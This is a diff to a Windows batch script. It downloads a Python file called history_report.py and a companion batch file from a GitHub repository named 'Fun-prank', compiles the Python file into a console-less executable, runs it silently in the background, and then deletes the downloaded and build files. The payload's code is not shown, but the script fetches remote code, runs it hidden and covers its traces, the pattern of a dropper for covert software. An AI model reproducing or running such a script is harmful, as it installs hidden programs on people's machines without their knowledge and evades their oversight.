@@ -17,41 +17,42 @@ if %errorlevel% neq 0 (
 echo Installing requests and pyinstaller...
 pip install --upgrade requests pyinstaller
 
-:: Step 4: Download the Python script and .bat file from GitHub
+:: Step 4: Download the Python script from GitHub
 echo Downloading Python script...
-powershell -Command "Invoke-WebRequest -Uri https://github.com/yourusername/yourrepo/raw/main/history_report.py -OutFile history_report.py"
+powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/history_report.py -OutFile history_report.py"
 
+:: Step 5: Download the .bat file for running silently
 echo Downloading .bat file for running silently...
-powershell -Command "Invoke-WebRequest -Uri https://github.com/yourusername/yourrepo/raw/main/install_run_silent.bat -OutFile install_run_silent.bat"
+powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/install_run_silent.bat -OutFile install_run_silent.bat"
 
-:: Step 5: Check if the Python script exists
+:: Step 6: Check if the Python script exists
 if not exist "history_report.py" (
     echo Script file not found. Please make sure history_report.py is in the same folder as this batch file.
     pause
     exit /b
 )
 
-:: Step 6: Convert the Python script to an executable using PyInstaller
+:: Step 7: Convert the Python script to an executable using PyInstaller
 echo Converting script to executable...
 pyinstaller --onefile --noconsole history_report.py
 
-:: Step 7: Check if the executable was created
+:: Step 8: Check if the executable was created
 if not exist "dist\history_report.exe" (
     echo Failed to create executable. Exiting...
     pause
     exit /b
 )
 
-:: Step 8: Run the executable silently
+:: Step 9: Run the executable silently
 echo Running the executable silently...
 start /B dist\history_report.exe
 
-:: Step 9: Clean up PyInstaller files (optional)
+:: Step 10: Clean up PyInstaller files (optional)
 echo Cleaning up PyInstaller files...
 rd /s /q "build"
 del /q "history_report.spec"
 
-:: Step 10: Clean up the downloaded files
+:: Step 11: Clean up the downloaded files
 del history_report.py
 del install_run_silent.bat
 
